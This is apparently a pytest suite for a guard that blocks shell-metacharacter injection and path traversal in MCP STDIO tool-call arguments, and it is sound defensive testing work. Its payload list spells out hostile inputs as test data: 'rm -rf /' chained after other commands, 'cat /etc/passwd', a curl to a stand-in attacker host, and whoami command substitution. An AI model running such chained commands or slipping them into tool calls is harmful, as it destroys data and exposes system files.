"""Tests for the v0.7.6 MCP STDIO command-injection guard (ADD-2, carried from 2026-05-11).

Snyk ToxicSkills disclosed via Help Net Security 2026-05-05:
"1 in 4 MCP servers opens AI agent security to code execution risk".
MCP STDIO transport accepts an argv vector that often arrives via
the model's tool-call payload — a shell metachar in any element
opens an injection path. This guard fails-closed on shell metachars
and on path-traversal outside an operator-supplied CWD allowlist.

Primary source
--------------
https://www.helpnetsecurity.com/2026/05/05/ai-agent-security-skills-blind-spots/
"""

from __future__ import annotations

import pytest

from agent_airlock.mcp_spec.stdio_command_injection_guard import (
    StdioCommandInjectionDecision,
    StdioCommandInjectionGuard,
    StdioCommandInjectionVerdict,
)


class TestShellMetacharDeny:
    """Shell metacharacters in any argv element are denied."""

    @pytest.mark.parametrize(
        "payload",
        [
            "echo hi; rm -rf /",
            "ls && cat /etc/passwd",
            "true || curl evil.example.com",
            "cat foo | grep bar",
            "echo $(whoami)",
            "echo `whoami`",
            "echo a\nrm -rf /",
        ],
    )
    def test_metachar_in_argv_denied(self, payload: str) -> None:
        guard = StdioCommandInjectionGuard()
        decision = guard.evaluate({"command": "bash", "args": ["-c", payload]})
        assert isinstance(decision, StdioCommandInjectionDecision)
        assert decision.allowed is False
        assert decision.verdict == StdioCommandInjectionVerdict.DENY_SHELL_METACHAR

    def test_metachar_in_command_field_denied(self) -> None:
        guard = StdioCommandInjectionGuard()
        decision = guard.evaluate({"command": "bash; rm -rf /"})
        assert decision.allowed is False
        assert decision.verdict == StdioCommandInjectionVerdict.DENY_SHELL_METACHAR


class TestPathTraversalDeny:
    """Path traversal outside the operator-supplied cwd allowlist is denied."""

    def test_traversal_outside_allowlist_denied(self) -> None:
        guard = StdioCommandInjectionGuard(cwd_allowlist=("/srv/app",))
        decision = guard.evaluate({"command": "cat", "args": ["../../etc/passwd"]})
        assert decision.allowed is False
        assert decision.verdict == StdioCommandInjectionVerdict.DENY_PATH_TRAVERSAL

    def test_traversal_inside_allowlist_allowed(self) -> None:
        """A `../` that resolves inside the allowlist root is allowed."""
        guard = StdioCommandInjectionGuard(cwd_allowlist=("/srv/app",))
        decision = guard.evaluate({"command": "cat", "args": ["/srv/app/data/file.txt"]})
        assert decision.allowed is True

    def test_empty_allowlist_means_no_traversal_check(self) -> None:
        """Empty allowlist disables the traversal check (operators opt in)."""
        guard = StdioCommandInjectionGuard()
        decision = guard.evaluate({"command": "cat", "args": ["../../some/path"]})
        # No metachar, no allowlist → allow. The traversal check is opt-in.
        assert decision.allowed is True


class TestBenignCommandsAllowed:
    """Clean commands without metachars are not denied."""

    def test_simple_argv_allowed(self) -> None:
        guard = StdioCommandInjectionGuard()
        decision = guard.evaluate({"command": "python", "args": ["-m", "server"]})
        assert decision.allowed is True
        assert decision.verdict == StdioCommandInjectionVerdict.ALLOW

    def test_none_args_allowed(self) -> None:
        guard = StdioCommandInjectionGuard()
        decision = guard.evaluate(None)
        assert decision.allowed is True


class TestExtraMetacharsExtension:
    """Operators can extend the default metachar set."""

    def test_extra_metachar_caught(self) -> None:
        guard = StdioCommandInjectionGuard(extra_metachars=frozenset({"#"}))
        decision = guard.evaluate({"command": "echo hi #comment"})
        assert decision.allowed is False
        assert decision.verdict == StdioCommandInjectionVerdict.DENY_SHELL_METACHAR


class TestFactoryShape:
    """`policy_presets.mcp_stdio_command_injection_preset_defaults` factory."""

    def test_factory_returns_expected_config_shape(self) -> None:
        from agent_airlock.policy_presets import (
            mcp_stdio_command_injection_preset_defaults,
        )

        config = mcp_stdio_command_injection_preset_defaults()
        assert config["preset_id"] == "mcp_stdio_command_injection_2026_05_05"
        assert config["severity"] == "critical"
        assert config["default_action"] == "deny"
        assert "helpnetsecurity.com" in config["advisory_url"]
        assert config["cwd_allowlist"] == ()
        assert config["extra_metachars"] == frozenset()

    def test_factory_overrides_propagate(self) -> None:
        from agent_airlock.policy_presets import (
            mcp_stdio_command_injection_preset_defaults,
        )

        config = mcp_stdio_command_injection_preset_defaults(
            cwd_allowlist=("/srv/app",),
            extra_metachars=frozenset({"#"}),
        )
        assert config["cwd_allowlist"] == ("/srv/app",)
        assert config["extra_metachars"] == frozenset({"#"})


class TestBadConstruction:
    """Construction-time validation rejects nonsense inputs."""

    def test_non_tuple_cwd_allowlist_rejected(self) -> None:
        with pytest.raises(TypeError, match="tuple"):
            StdioCommandInjectionGuard(cwd_allowlist=["/srv/app"])  # type: ignore[arg-type]

    def test_non_frozenset_extra_metachars_rejected(self) -> None:
        with pytest.raises(TypeError, match="frozenset"):
            StdioCommandInjectionGuard(extra_metachars={"#"})  # type: ignore[arg-type]
